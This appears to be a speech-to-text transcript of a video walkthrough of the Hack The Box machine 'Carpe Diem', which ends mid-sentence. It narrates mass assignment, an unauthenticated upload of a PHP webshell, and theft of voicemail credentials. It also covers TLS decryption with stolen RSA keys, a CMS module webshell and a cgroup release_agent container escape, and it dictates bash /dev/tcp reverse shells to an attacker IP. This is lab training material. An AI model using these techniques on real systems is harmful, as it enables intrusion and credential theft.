 what's going on YouTube this is ipsec I'm doing Carpe Diem from hack the box and I really like this box because there's multiple passageways throughout it um the very first one is the foothold you find a web portal and you're supposed to use a mass assignment vulnerability to upgrade your user to an admin user that then leaks and upload functionality of the site but the upload functionality doesn't require authentication so it's also an idor vulnerability and you can find the upload function if you just fuzz the API so there's two different ways to upload a shell to the site and then once you get on the box there's some things to do with voice over IP creating a soft phone to access someone's voicemail box to get a password there's some RSA decryption because you can TCP dump and a browser is not using a secure https Cipher um there's a pretty cool Docker Escape there's a mongodb instance you can enumerate there's just so much going on in this box so let's just jump in as always we're going to start off with the nmap so Dash SC for default scripts SV um rate versions OA I'll put all formats playing the nmap directory and call it Carpe Diem and then the IP address of 10 10 11.167 this can take some time to run so I've already ran it looking at the results we have just two ports open the first one being SSH on Port 22 and its Banner tells us it's an Ubuntu Server if we want to see exactly what distribution it is we can copy the 8.2.p1 and the for Ubuntu throw it into Google and Google would tell us this is I believe a Ubuntu focal right so we know exactly what distribution this likely is the next thing we have is HTTP on Port 80. it's running engine X version 1.18.0 and I'd also like to just check if this is a version that's common in focal so we can go here find a package and once this comes back click engine X and we see it is indeed bundled with focal quite often so right now it looks like this is just one box if this was like engine X 1.16 or 1.20 a page that's not there I would be thinking Docker is at player some type of like routing so Network address translation or something but um no real interesting output via nmap so let's just take a look at the website so let's copy this link and go to the page and we get a just generic countdown um we do have the hostname being leaked right here so carpaydm.hdb so I'm going to do sudo VI Etsy Hurst and then we can do 10 10 11 167 and I would probably run a go Buster here just to see if there's any other pages but at this point um I know it's not and I don't want to waste too much time I checked index.html this page comes back PHP doesn't so I know this is a static web page we can try subscribing so I'll do root ipsec.rocks let's make sure we go over to burp Suite when we do this because we want to test for things like SQL injection click on subscribe and it just gets index.html question mark we don't have root.ips.rocks here so this button does absolutely nothing I'm going to start just doing a virtual host uh fuzz on crepe diem seeing if there's any type of sub domains here because that's the only thing this website is communicating to us so I'm going to do 5 off dash uh not codebadm.hcb let's do HTTP 10 10 11 167. and then the host header we'll do hers colon Buzz Dot curfewdm.hdb and the word list will use opt seclist Discovery DNS sub domains let's do 5000.txt right I'm just going to hit enter we see the output and I'm going to do filter size 2875 because we want to hide everything with that size and I also do match code all Dash MC all and the reason why I'm doing that is because fuff has this annoying habit of having the match are hard-coded to only certain status codes I like matching all status codes so that's why I do MCO and we see portal comes back right away so I'm going to go back into our host file so sudo VI Etsy host and we can add 10 10 11 we had Carpe Diem there uh we can do portal.carpaydm.htb I'm looking at this uh it looks like when I changed my size the like standard out buffer screwed up but only portal comes back so let's take a look at portal.carpedm.hdb and we get the motorcycle store portal so I'm gonna click on a link just to see exactly how this website works we go to a page we have P equals bikes and C equals something um right off the top I'm thinking this is like some type of secure parameter thing I'm guessing p is equal to page and C is equal to checksum so I'm gonna try bikes.php to see if this page exists and it looks like it does I'm just going to put something that doesn't exist here we get a 404 so I have confirmed I'm guessing this p is going to append dot PHP to this now the next thing I want to check is this checksum um what I think is happening here is the web server is taking um the P parameter right and it's going to prepend or append some type of secret right and what this would do is prevent us from being able to modify this parameter so it's really easy to test let's just see if there's any other P we can get so if I go to categories let's do sports bikes oh scooter so this bikes is changing and the seat isn't so that's different um is there brand let's go brand brand is now changing into s so this is definitely not a check sum um did not mean to go to BBC uh portal Carpe Diem I don't know what I clicked on that that was weird right maybe click here there is view bike so I bet viewbike is a page right so if I change view bike to bikes we still get something if I put anything here we get 404 index.php probably exists I'm going to change it to that and it's hanging and we get an error message so um what happened here is we included index and then that include try to include index again and we just did it until we ran out of memory so now we have confirmed there's definitely lfi here and this C is not checksum um we went to like crackstation.net we could potentially crack this so let's see fire hydrants check oh come on I hate these captures verify new images come on this is like the slowest load I've ever seen there we go and this is equal to one so I'm guessing um each of these is in a database and this checksum is going to a different page so since we know the checksum is being at play We Should test for SQL injection as well so let's turn intercept on put this in there's gonna be two things we test in this parameter first SQL injection let's put a single quote okay uh that did not work let's do nothing we get 21 412 bytes I'm going to put a single quote 10 000 bytes let's put a comment at the end still 10 000 change that uh 19th that was weird that's a different thing I'm not sure exactly what happened there I was expecting only twenty thousand or um we'll have to check what the page looks like with a double quote there so let's just turn rep Suite off I'm going to send a double quote and we get no bike listed put a comment no bike listed so I'm guessing the parameter is going to be indeed a single quote but there's no SQL injection here so let's move on and play with this so we got the bikes I'm just going to go into here and see if we can extract the source code so PHP colon filter convert dot base64-in code and then resource is equal to bikes right if I can spell it right and we get 404 not found so I'm not exactly sure what's happening here we know we're probably at the start of the include but uh maybe the include is checking if the file exists before it loads the page and if it was doing that then this whole PHP filter the file doesn't exist so it doesn't load the page um I would take note of this potential vulnerability but I it's literally the first thing I saw when I started taking a look at this page so just take note of it and move on because that could be a rabbit hole so let's try the login feature if I try admin admin invalid credentials I'd probably send this to like SQL map after testing for um basic injection don't see it here don't see it in the password either we can click create account and let's just do ipsec for all the parameters and then we'll intercept it so proxy intercept on click on register and I did not intercept here shoot um let's log out real quick out create account ipsack for everything we'll do ipsec two for that and then intercept on intercept on register so we can see it's doing a post to classes master.php function is equal to register and right now I'd probably start fuzzing this function because this looks like an API and I always like testing apis so let us um I don't know why it's doing that let's do buff oh I'm in caps lock Dash U HTTP portal.comdm.htb slash classes Master this and then fuzz this function and what do we want to do the word list um opt seclist discovery is it web content API API actions.txt okay so we can do a here we probably want to filter size for zero match code all and only register and we notice that register is not case sensitive they both go to the same thing but we know the API directory is in this classes so I wonder if there's anything else right so this is where I'm going to run Go Buster so go Buster Dash U put this and we also want to put it in directory mode Dash expert extension PHP word list opt seclist Discovery web content raft small words dot text and we're gonna see if there's any um other fields right so we got a login.php in this classes directory see if there is anything else we probably should hide all 403s but um oh well and I'm just going to let this run and we'll come back to when it's done it's not done yet you see it's only at like six percent but the one I wanted to show off did come back users.php right so I'm just going to kill this for the sake of time and we can run against it and this is an unintended path but this is actually how I um attack this box when I did it so we can put users.php here and we're still gonna fuzz for all the parameters I'm guessing this F is equal to function right so we're testing this API now if there's any other user functions and we have upload right so let's go take a look at what this feature is so I'm going to pass this over to repeater I'm going to do users dot PHP f is equal to upload and we get error multi-part form data missing so at this point we have to create a upload form and the way I'm going to do this is just cheating a little bit we're going to use chat.openai.com because that's been all the rage lately so here I am at chat.openai.com and we just ask you questions so if I just say create and HTML upload form we can see it's going to give me all the code so I'm probably going to replace this with um we'll replace stack overflow with this because it's just so cool um we got the form we can make the www go in here V form dot HTML paste this in and start a web server so now let's go localhost slash forum.html 0.8 000 let's take this rip Suite off so we get there insert something I'm just going to do bloodhound.destop and what we want to do here is intercept the request so I'm just going to upload and now we have what an upload form looks like we need this content type and then all this data right so I'm going to copy this and paste it into this request where we have it missing something right the only thing I need to make sure is I don't have content type twice in this request and I don't think I do let's see content type I do so get rid of this one because it's multi-part form encoded uh I did not highlight everything come on stop going up there we go and we send it and we get error missing file upload and form data it's looking for a file underscore upload and we have file Dash upload from uh just example so I'm going to change that to be this and we see it says it uploaded it so at this point I'm going to try testing for uploading a PHP shell so let's do question mark PHP uh system get I don't do a quote there CMD right this is it and we can just do shell.php so it says it uploaded it I'm probably just going to escape that one backslash and we'll see if we can access it so turn this off portal Carpe Diem slash uploads uh cannot blank execute command because we did not give it so if command equals ID we have it here so I'm going to do um I should have done request here so let's replace it I'm just going to do this because it's easier to put a reverse shell in a request than it is um otherwise I think this has to be all capitals actually I didn't know that let's try this again so this one with all capitals okay so send this to brip suite and we can get a shell and I'm going to show the intended way of finding all this because the intended way is also interesting I just wanted to highlight like the power of fuzzing when you come across an API right so Dev TCP 10 10 14 8 9001 0 and 1. copy we can get rid of this web server nclvmp 9001 what there we go and we have a shell so I'm going to take a step back real quick before we do a lot of enumeration here and we're going to do this the intended way right so let's go back to portal.hdb all right portal.carpedm.hdb and make sure we are logged out awesome so now we can go back to the account registration so I'm just going to register a new account and we'll just put junk in this address username we'll call this ipsec3 I guess and intercept this request and I think this part may have been unintended but I wanted to show it as well um we send this over to the repeater Tab and put like a single quote in the username we get a SQL error out telling us the syntax right so I'm just going to copy all this and we'll see if we have any hidden parameters come on copy well there's a lot of syntax there we go so we have this insert into users and then it's setting first name last name contact gender address username password right here we know the password is going to be md5 sum right now but we don't have any extra parameters here and we can test for Mass assignment because we see this error message by just doing and um we'll do please is equal to subscribe and then when I send this we're going to search this request for please and we can see it putting this in our insert statement so if we knew how this application stored like in the database we could add a parameter that says admin or group is equal to zero which is probably admin or admin equals true if we know how to define admin at this point we can register an account and make ourselves admin because the registration script to this API is just taking like PHP input like anything we put here and crafting a SQL statement out of it right so um at this point I can't really take advantage of it because this isn't a completely easily findable open source application at least not that I could find so I can't look at how the database works we can make a lot of guessing but um it's not a intuitive thing right but if we go to our account and if we go to manage account and we try to um update this so let's intercept on click update and we look at this we can see login un underscore type so this was like a hidden parameter on our account page and this is the database field for a account so on the registration if we put login underscore type is equal to zero it would have put that in the request and we would have created an admin account but we can just do it here because it's like a mass assignment type of thing we forward it and account has been updated successfully if we refresh this page it doesn't give us any new information but if we guessed like slash admin uh account denied what I thought I changed my account to be an admin let's try this again so put this in tersect on click update login type is equal to this I wonder if I need to put my old password in or maybe me refreshing put it back to two access denied okay this is weird that's how you're supposed to do it um I'm guessing it's because I'm putting an invalid password or something so I'm going to restart this we'll just do ipsec for for everything and in this creation I'm going to do login underscore type and see if we can get this way the demo gods have me and I did not intercept the request so we'll try it this way again so ipsec 4 should be the password intercept is on login type is equal to this forward account has been updated I'm just going to go to portal Carpe Diem slash admin access denied I wonder if I should re-log in log out log in um ipsec four ipsec four try slash admin access denied maybe we should try login type is equal to one maybe it's not zero manage account and this is where I'm upset I'm showing the intended path without ever really fully testing it uh let's see login type is equal to one that's weird that it was blank there account has been updated slash admin okay login type is supposed to equal one if you do zero you get an error but here if we go to submit ticket or quarterly report upload action add and then continue and we look at this request it's sending us to this class is upload.php which we've already shown how to exploit right so let's now just continue with the box it's obvious we're in a container because we have this hostname that looks like a Docker thing but before we enumerate I won't just get a proper PTY so let's do this real quick uh spawn bash like this and then sdty raw minus Echo FG enter so now I have tab all to complete um I'm also going to do export terms equal to X term because I like clearing the screen since we're in a doc container I'm guessing there's no other users in pass WD um that's odd we have TCP dump so maybe we can run TCP dump we'll take a look at that in a minute but main thing I want to get is credentials out of this right so I'm going to do find dot grep config because that's normally a good name to use to look for a configuration file and if we look at this let's see I'm guessing it's dbconnection.php that sounds like a good place to look so less classes uh let's cap this I guess and we have my SQL credentials so we could take a look at my sequel um it's not actually going to show us anything so I'm not going to do that um but we get a credential we could save and maybe it's a user credential in the box but nothing really there we go into classes to see what else there is there is truedesk.php if I look at what this is we see um trudesk.carpaydm.hdb some type of API key and a portal um so let's take a look at this domain so sudo VI Etsy hosts and we can take a look at true desk carpe diem go here uh let's turn this off we just get a login page so the first thing I would do is try guessing a credential right um and if we go all the way up we have this password so we could try like logging in with this password and uh this username right and combine these things to see if this is like a global password uh we don't get logged in but we do have an API key so I wonder how we can use this API key I'm going to Google true desk GitHub to see if this just open source software and it looks like it is so is there a documentation let's see API let's see true desk API maybe just Google this docs.trudesk dot whatever let's see API key can be found in your profile send the API key in the access token header with each request so all we do is make a request to the API and send our key with it right or access token I'm trying to find example to test so if we do get API V1 users okay so let's get a request here this send it and then we can do API V1 users and we get invalid access token which is good we didn't put the access token yet it tells us to put it in the header like this I believe we can go back grab this and paste maybe it needs two line breaks not authorized for this API call we put this invalid access token so we know we're doing the API correctly here now so what we want to do is see what functionality we have right and this is a help desk so we probably want to get tickets right so if I go here we can do get API V1 tickets and the uid if I just get the API V1 tickets what happens uh we just get a blank thing I'm guessing that means there's no tickets assigned to a user there is a search capability so we could try searching so search and then search is equal to something so tickets search is equal to I'm going to do I or a and we're not getting anything so I'm guessing we can't search for tickets um if we knew like a uid we could probably get this and we could fuzz this as well but one of the things that's really helpful is looking at the source code since this is open source um we have that ability right so I'm gonna grab this string go to the GitHub page and see if we can find this real quick so search in this Repository and see what comes up we can turn grip Suite off maybe that'll make it go a little bit faster and let's see we have this routes.js and this gives us a lot more endpoints than the actual documentation did and this is somewhat common in just apis that not everything gets documented and one of the super helpful one is the stats Command right so if we do ticket stats we can see the most active ticket has a uid of 1006 and we could just grab this and we have the ticket right so this is probably the easiest way to do this step um there is an unintended way since we're in a DACA container we don't have access to like if config or SS or IP so we'd have to enumerate proc but if I did like proc TCP let's or proc net TCP I think we get IP addresses right and this is IP addresses encoding in HEX so I think AC is 172. um let's see uh let's Google ipex encode to decimal I think and we can put this here I should have used the chat open AI thing for this right we can see yeah 172 1706. so zero one probably exists I'm guessing if we do we have ping we do 172. 1705 see we can ping other dockers on this and the mongodb database for this ticketing system is exposed so we can upload like chisel and then just dump this out right and maybe we'll do it at the end of the video but we have all the information we want here so let's read the ticket we could also fuzz for all the tickets so like one thousand one one thousand two three four four is a ticket five six whatever so let's see I'm just going to copy this actually to a file so we can grep so copy this this is a long request okay V ticket dot Json paste cut this pipe it to JQ and then let's see we want to get the fields that are probably used for talking to users so we can actually read this easily um we don't want owner network engineer let's see to get created comment let's just grab for comment and let's see thanks Robert the employee ID is 96.50 all set up when he gets to his office on his first day have him log into his phone first I'll leave him a voicemail with his initial credentials for Access his phone's pin code will be 20 uh yeah 2022 and you can dial star six two also let me know if he wants to use a desktop for the cell phone uh we've been testing zoiper with some users on an end phone so we're going to look at what zoiper is so first I'm just gonna do apt search zoiper and it doesn't look like it's in the app repository so if I just Google this we see it's a free VoIP zip phone dialer so I'm going to go over to download and let's see we should be able to download for Linux uh I think this may be it click on the Debian package save it and it looks like it is saving now that it's downloaded I'm just going to do sudo D package Dash I downloads zoiper the Debian package and it should download it looks like it's unpacking zoiper5 so let's just run this and continue as a free user and we need user at the Sip name right and it looks like all our messages were they up here they were so we should copy this so let's see what do we need here we need user and let username should be the last four so 96.50 so V notes dot text 96.50 at domain we don't know that and I think the PIN code he said was 2020 2022 so the PIN code is the year I would try all voicemails for this pin code as well um but we need to figure out what the actual domain of this is we could just guess at like zoiper.htb right or not zoiper um Carpe Diem 9650 96 50 at carpaydm.hdb 2022 if we click login um it looks like that may be wrong or going so it found IX and sip so let's just go in and I guess we can skip this and how do we get to voicemail if we click this click here to learn more to upgrade that's not right let's try calling yourself because that's generally how you can access voicemail on phones so if we do this we just get call ended so it doesn't look like that works um if we went back to the actual notes it does tell us that we can dial Star 62 to access voicemail so I'm going to do this and hope the sound comes through this word it wants the password so let's how do we do this how do I end it numbers login and correct password the keypad is not available right now um that's weird there we go to login incorrect password I think I just hung up let's do star six two dial password there we go [Music] you have one new message press one for new messages first message received May 18th 2022 at 5 50 6 p.m come on hey horse welcome aboard we certainly needed more Network Engineers to assist with the infrastructure your account is ready to go your password is capital A U capital r j 4 p x q 9 Q capital p k please reset it at your earliest convenience as well as your phone pin code let me know if you have any issues Robert press three for advanced options press 5 to repeat the current message press 7 to delete this message press a first message I think we said the username as well May 18th two thousand twenty two at five fifty six pm hey Horace welcome aboard we certainly needed more Network Engineers to assist with the infrastructure name um let's go back in the tickets and maybe the username's actually there I'm going to search for 2022. and let's see that's calling see hey Adam voicemail set up on his phone initial credentials you can dial so we should look more at this ticket because we don't know what the username is and maybe they sent it in the ticket here it is we got the subject of the ticket new employee onboarding Horus flakis I guess that's the name and based upon the naming convention it's probably H and then the last name so let's try sshing in with the last name or the username of H flaccus so SSH at prepaidm.htb copy this password paste it in and we get on the box and because it says Carpe Diem not some random name we know we're not in a Docker container right now anyways the first thing I want to look for is just files in my home directory and there's nothing really of Interest so we'll go up one directory look at other users on the box and just see if we can access any directories it doesn't look like we can um we do a PS Dash EF or are you it looks like um we can't see how the process is running by cat Etsy FS tab let's see how is proc mounted hide PID equals two so we can't look at other processes that are running by not us because slash proc is mounted with this hide pit equals two so we can't Snoop on processes um we knew Docker was running though c s s o ntp we can see a list of all the ports that are listening so I'm guessing eight thousand eight thousand one eight thousand two kind of go to different containers um sometimes if you look at Etsy host you can leak other host names of the box which we see backdrop.carpedm.hdb so if I go into my host file so etsyhost and try this and we go browse it doesn't give us anything new so let's try just setting up a proxy real quick so I'm going to on a very new line hit squiggly C so it drops us into the SSH prompt and dash d1080 for a dynamic socks proxy on Port 1080 and I can configure my browser to use that as a proxy and we can try hitting each of these ports right forbidden on 8000 8001 is true desk and 8002 is a bad request because it wants to talk https so let's try https here um let's view this certificate to see what it says uh backdrop.carpaydm.hdb so this is definitely going to be the backdrop CMS and we get log well not logged in here but we just have this page right and we can try logging in trying like admin admin and things and don't get anything if we ran lint piece on the box or just think backed on our enumerating dock containers at TCP dump um it's installed on this box if you do which TCP dump and it's also installed with a capability that allows any user to run it and again limp piece would tell us this or we can just get cap and see the capabilities there and if we do let's see ipaddr to list all the interfaces there is a Docker interface so we can snoop in and all the traffic running on this box on Docker right so TCP dump dash i docker0 w um I'm just going to write to my home directory output.cap and actually we should do Dash s0 to capture everything and I'm gonna let this run for a minute and then we'll analyze the output okay I think it's been about a minute we've probably captured enough data we see 272 packets so if I go in my home we have output.cap so let's just try downloading it real quick um let's see SCP H Flac s at prepaidm.hdb [Music] output.cap to my directory and we can copy this password paste it and now if I just Wireshark on output.cap we should be able to load this up and see what data is here let's make this a little bit bigger so I'm going to go to preferences layout font and colors and we can change this let's go up to 24. does this work immediately oh man maybe I don't want to make it this big preferences bottom layout let's go to 18. 18 should be a fine size that both of us can use okay so it looks like a lot of this data is SSL encrypted right we could try tcp.port is equal to 8002 we don't really get anything and that's because we're on the docker interface it's talking to that IP probably over a 443 or something and we just see TLS data which is encrypted data if we look at the hello packet and look at TLS the transport layer security we can dig into this a little bit so the handshake I'm on hello protocol and if we look at this extension let's see appreciate a key so this is the client saying everything they support so I want to go to the actual key exchange and the font size is messing me up a little bit okay key exchange here and we see the handshake protocol is going to be RSA and when it's RSA this is I don't see any like um port forward secrecy or PFS or things like that uh can I open up another wire stroke real quick see if this works uh demo gods are probably gonna have me at this one uh that did not work let's run Wireshark with sudo because I just want to go to Google so you can see what a normal thing looks like right because finding uh RSA on a web server is I want to say somewhat odd because most of it is I forget the algorithm but not RSA right so let's go to Google so we got our data here uh it's using a lot of quick come on key exchange server hello done what is it server hello change Cipher is this it handshake key exchange protocol yeah easy diffie-hellman so this one supports um diffie-hellman does port forward secrecy so it's going to uh generate a secret key between both this and the client and we can't just decrypt data with a certificate but because this is TLS version 1.2 and it's RSA encrypted if we had the certificate to this we'd be able to decrypt it right so let's go back to our host let's see where's my SSH session I think it's on this panel nope clean up this a little bit here we go so I'm going to find slash um username H plaque see if there's anything here because all we're doing is looking for a certificate at this point so maybe find let's send everything to error and grab for a backdrop and we have SSL certificates right here so let's see if we can download these real quick so let's SCP them oh we can just do SCP H black guess at Carpe Diem Dot htb dot star copy the password paste okay so now we have the RSA certificates if we go back into file of this let's see it's been a while since I've done this preferences RSA keys let's see does it add new key file I don't think it is maybe it is okay let's see did it suddenly decrypt these I don't think it did because I'm not saying just HTTP yet maybe I can refresh uh Ctrl r yes uh Ctrl R to refresh and we can see we now have actual decrypted data so we can follow the HTTP stream and we get a username and password so let's copy this to a text file so V notes.txt I already have that be lazy save it like this and we can delete everything after this sweet so we should be able to log into backdrop.cms so where was that right here paste the password paste the user login and we have to do our proxy I did control shifter so it resends my whole payload and we log into this backdrop CMS now whenever you're an administrator of a web application chances are you want to look for some type of Plug-In or module functionality because that's how you can add code to the application so I click on the install modules and go to manual installation and we can upload a module theme or layout so if I just Google let's Google um first we have to turn our proxy off because we're proxying through the box so I'm gonna go um backdrop module example go to Google and they have some examples on this page let's just download it and then we can move downloads examples and then unzip examples and we just can pick any example we want um I'm going to try like a form example real quick and I'm just going to see if I can add a file to this so I'm going to say cmd.php and we're just going to keep it really simple system request CMD like this and then zip Dash R for recursive uh form example dot zip the file name I want and like this so now when I go and upload this module so let's see examples go to form example.zip let's make sure we're proxying again to go through because we're using the SSH proxy upload it and let's see into file form example does not define a type and tribute so I'm guessing this example was wrong so let's see I'm going to change this see is there a tight since I'm getting it off the website I don't think it's out of date I was thinking it may have been out of date but maybe not let's look at the info why isn't there we go type let's see type equals module I'm just going to try this real quick if this one doesn't work then we will um find a different example so form example dot zip Dash r let's try this again yeah it looks like it worked by just randomly adding the variable it asked for so enable newly oh I probably did not want to do that um okay it's still disabled here so we want to find out where this dropped to disk so I bet if I just Google GitHub backdrop and we need to turn the proxy off we can guess at where it gets stored so let's see probably modules so we called it form underscore example so what I'm going to do is go to slash modules forbidden this is good form underscore example forbidden that's good because if the module didn't exist we get this right so we're going to try cmd.php we get a blank page if we do CMD equals ID we get this so now we have code execution on this box so let's um I guess we can do this and hope it works Dev TCP 10 10 14 8 9 1 0 and 1 like this I bet it's not going to work I forget the trick to do this in a get request the ovmp 9001 yeah so one of these variables in this does not like URL encoding I'm guessing it's the Ampersand so let's see um we can just do this in rip Suite real quick decoder encode as URL percent 26. let me try putting this in percent 26. and hoping for the best still nothing okay I think I can go in burp suite and we can configure this to use a proxy Upstream proxy server 127001 proxy hairs zero zero one ten eighty see is this going to work oh shoot um not Upstream proxy we have a socks proxy right here so 127001 1080. new socks proxy so now I should be able to use burp suite and go through this tunnel it's got a different SSL certificate that is fine awesome so let's try this again I wonder if there's a cleanup script that just um blocked me because we're getting a 404 not bound is it just on this directory if it is we'll have to re-upload the module yeah so we'll re-upload it but before let's just create our Command and as I'm typing this I realized I missed one of those ampersands so I want to buy URL encoded both of them if it would have worked okay we can go to brip Suite turn intercept off and let's see we want to go to back a few times admin reports admin modules okay let's re-upload this form examples.zip upload installation successful uh that's not the thing I want to send this is it's hanging and we have a shell so we're in a different Docker now I'm gonna do Python 3-c and put PTY pty.spawn Ben Bash oh shoot FG um let's see which python which Python 3 which script okay we have the script binary so I think I can do script Dash Q then Bash uh let's see script Dash Q Bev null there we go sdty raw minus Echo FG enter enter Bash and now I have tab auto complete so we did that with the script binary and now we're in this doctor which is backdrop CMS we do a PS on this we can see there is this thing that is running sleep um or terminal cut it off so let's fix our terminal as TTY Dash a we want rows 26 columns 105. so stty Rose 26 call 125 is it calls there we go psef and now it's not cutting off because we fix our terminal but we can see it's executing this script heartbeat.sh every 45 seconds so let's take a look at the permissions on this root root um owns it and only root can write so let's take a look at heartbeat.sh and we can see let's see let's clear the screen first and then do it export term is equal to X term now this is a bit cleaner so at the very top we got this checksum and it's doing an md5 sum on for a www.html backdrop whatever and if the checksum is not this then it's going to exit so it looks like we can't modify this file so it's going to do PHP against backdrop.sh and set this root directory so since we can't modify this file let's see if this file controls anything right and looking at this let's see even though it ends in dot sh it is a PHP script which is weird and is going to execute an instance of backdrop so we set the working directory to where it is and is this just gonna like execute index.php I believe so it's a long script but we give our www.html we got index.html and backdrop so let's see what was that script that I just catted let's grab index out of that and it's looking for index.php so that's the script it's going to execute so maybe it goes into backdrop as their index.php here there is so the web server looks like it's probably going to execute this PHP script as stupid as this injection is Let's do an osoa on index.php and www data can write to it so if we VI index.php uh not found I'm gonna hate my life if I do this nope Nano not found um I guess we can just create another reverse shell so I'm guessing root is running this right and I want to get to the root user of the docker container because I'm assuming I need root to break out you can't really break out of a docking container as a low priv user so if root is executing this I should get a shell as root and then we can start looking at ways to escape Docker um so let's do CD temp lsla here I'm doing lsla to see if it looks like there's a protected temp directory so if I saw like Apache nginx directories here I'd probably switch to a different directory because that means um something's protecting this directory the system djl is what I was going to say let's just do Echo and then Bash two ipsec.sh by cat ipsec.sh we see Ben bash and then let's put a blank line and I know there's a way we could probably cat direct it to like end of file oh I just did something bad do that again and then we're gonna do two pipes so we don't overwrite it but I was going to say we could cat do the end of file thing but I never remembered how to do that off top my head so this is generally how I do it I [Music] Dev TCP 10 10 14 8. 9001 zero at and one I'm going to put this in single quotes to make sure we don't convert any of these to um special characters so if I cat temp ipsec.sh we have a reverse shell and if I execute this we can verify it works so now what we want to do is go back to our www.html backdrop and then we can do Echo uh the PHP so system slash temp ipsec dot sh two index.php and we want to put a semicolon here and before I direct it to a file let's just see what this looks like does it look like it's going to be good PHP it does look like it's going to be good PHP we can put a bash ahead of it just so we know it executes that way and then pipe this to index.php and what was it um it ran like every 45 seconds I think uh PS Dash EF grep opt every 45 seconds it runs heartbeat.sh which if we did it correctly we should get a shell so I'm just gonna sleep for 45 seconds and um we'll see if when the Sleep finishes if we have a root shell oddly enough it looks like it ran and I didn't get a shell so it's tail-1 index.php let's go back and backdrop I think because like the cron ran um it didn't exist and maybe I was already in this directory and I wrote to the file and it was like an old inode because every minute it's replacing this directory um so to account for that I'm going to go up one directory and right to it this way and if this is the case it's gonna be a really odd case but um we can go in backdrop real quick do a LS we can see the files here I'm gonna sleep 45 and when the sleep is done I'm gonna do an LS again and we're probably gonna see no files and we'll go out One Directory up one and see if I was again that's just because I'm in this directory something replaces it and kicks me out of the directory and it's just a weird shell Behavior so we'll see if that's the case here okay the Sleep finished and I still don't have a shell if I do LS we still have all the files tail-1 index.php does not exist we do this again this is going to be really annoying KL dash one we see the command there let's do tail-2 actually so that looks fine right this PHP code should be executed and if I do PHP Dash I or PHP Dash a I think it's in interpreter mode we can run this and temp ipsec no such file so I'm guessing something cleaned up my temperature file so let's see LS temp yeah temp ipsec does not exist so that's what was happening here there's some type of cleanup script that went and cleaned this up so let's do Dev shm and see if it still gets um erased so we can Echo then we want to do a blank line and then what was it Ash Dash I like this cat ipsec.sh it exists there www HTML and let's see that's not what we want let's go up what is it here Dev shm so let's go in backdrop real quick oh there we go so we got the shell it was definitely the cleanup scripts that were giving us a problem so script Dash Q Dev shm uh script Dash queue devnoll stty raw minus Echo FG enter FG enter enter export term is equal to X term and now we have a root cell on this Docker container and this prevask was really tough to find because it relies on a cve because if we look at the actual um capabilities so if we just do cap sh decode this this is capability effective all these are the same so it doesn't really matter but these are the effective capabilities that we have none of these are really abusable and there is a cve to enable more capabilities it pretty much enables all of them but both Lin peas and deep C I don't believe find this vulnerability it came out right around the time this box released so if I just Google unit 42 C group I think it'll show up so it is this post right and I'm not going to go over the entire post one of the best ways of explaining it oxdf did a post on this vulnerability if we just Google oxdfc group we can see he digs into c groups and exactly what it is um C group goes in like if you just read this comic right um it explains it really well it's just like a group of processes and then the overlay FS system is where the vulnerability actually is so um if you've used Docker before you have like I want to say images and containers and the containers can all use the same image and then they spawn their own file system off that image so that way if you have a Ubuntu image and 10 containers you're not using the whole disk of Ubuntu five times because that may be like one or two gigs and you keep reusing that same space so overlay FS is a way to Overlay a file system on top of another file system which saves space and that's what this comic is explaining but highly Rec recommend reading this pairs because it does do a decent job at explaining everything but the unit 42 post essentially says if we type unshare Dash u r m c Bash we get this error but now I'm going to um cat proc dollar dollar status and we see the capability effective has changed right so I do cap sh Dash Dash D code do this and we have all the capabilities so anytime we've done a Docker Escape um we can just redo that I wonder if like Dev I don't have like Dev SDA so I don't have the full disk I think that would have to be shared at the start but the bit um best way probably to get code execution is to attack oval AFS so what I'm going to do is Mount Dash T C group Dash o RDMA C group slash mount and before I run this we can do an OS command so slash Mount was empty now slash mount has the C group so I'm going to make the slash mount ipsec and if I look in this we can see the C grip as well um I'm going to Echo one to mount ipsec notify on release oh um it aired out as I was saying that so I'm not going to do tab autocomplete here so Echo one two Mount ipsec notify on release and this is what will enable us to trigger our code execution so now that that is set we need to get where the file exists because this is getting executed on the root file system so if I cut Etsy M tab this is going to show like the file system I'm just going to grep for overlay FS overlay not fs and we can see where it exists so this directory is where the actual file system exists on the host if I go to SSH let's see this is uh that was zoiper here's a s h I probably don't have permission to this directory um let's see can we just go to Overlay two overlay two I can't but if we did look in this directory this is going to be where all like the docker file systems are so we want to grab the upper directory I believe where the diff is and we have to be relatively quick here because there's something running every minute um I should put you safe now so let's see I want to what is it Echo let's see let's fix my terminal I thought I did this uh maybe I just didn't do it on the root shell s-t-t-y Rose 26 calls 125 I believe now when I paste this uh that looks fine no it doesn't is that right 105 is columns there we go let me paste this okay that looks better so now what I want to do is Echo that directory slash CMD and this can be a file I create on the box and I'm going to write that to release oh shoot I think that just said release agent so now when I trigger the notify on release which I already set to one it's going to execute this CMD command on the host um if I just do LS slash there is no CMD so I'm going to copy my reverse shell from earlier this ipsec.sh 2 CMD if I just do this we can see that exists now I'm going to give it executable and if I uh chmod plus X cat slash CMD we can see it's just my bash script so now the next step is I think we just Echo this to mount ipsec man this is annoying not having tab auto complete do Mount ipsec C group Dot prox y lvmp 9001 when I run this command um let's see that's I'm guessing the minute happened and ipsec got deleted which is annoying so let's do history LS slash so we don't have anything here um let's create a new window and let's just copy and paste everything in that we want to do so if we had this scripted out it becomes easy but because we don't have it scripted out it's a major pain so we want to copy this then chmod plus X CMD so this sets up our Command execution now we'll want to make their Mount ipsec and then echo1 to mount ipsec notify on release and then we need to um let's see is Mountain release agent still the same it is not so we want to Echo this to release agent like this and then I'm just going to do bin sh Dash C Echo two Mount ipsec C group Dot procs so long as I copied everything correctly this should work so what's Happening Here We copy our shell to slash CMD create the directory ipsec tell overlay FS to notify on release so we get code execution when the process dies and now we're going to tell it where to execute code which is that CMD and yeah that should be all she wrote so let's copy this and hope it works copy paste and there we go we got root at carpe diem so CD slash root dot SSH and we can cat ID RSA and if I wanted to I can ssh in as root but I don't think we have to do that to show the one piece I wanted to which was the um dumping the database so we can skip the whole help desk enumeration thing and I'm going to do it from the SSH connection just because it's easier there's nothing that stops you from doing this from that very first Docker container so I want to install the static nmap so static nmap binary go to Google we can download this once it loads download save and let's put this in a directory dub dub dub move downloads and map here right so python3 Dash M HTTP server W get 10 10 14 8 8 000 and map so installing and mapped to this box we're not installing it just dropping it and you could use like proxy chains and end map but whenever you like proxy and nmap it's just bad right so we knew when we're in the docking container because of the proc um net TCP file our IP was 172 17. I want to say 0.6 so I'm just going to do an nmap on 172 17 0 Dot uh we know one is the router but we can keep that so I'll do 1.5 right or one to six and I should say dash dash open and we can also do Dash V so it shows up open ports as it finds them and dash n so we don't 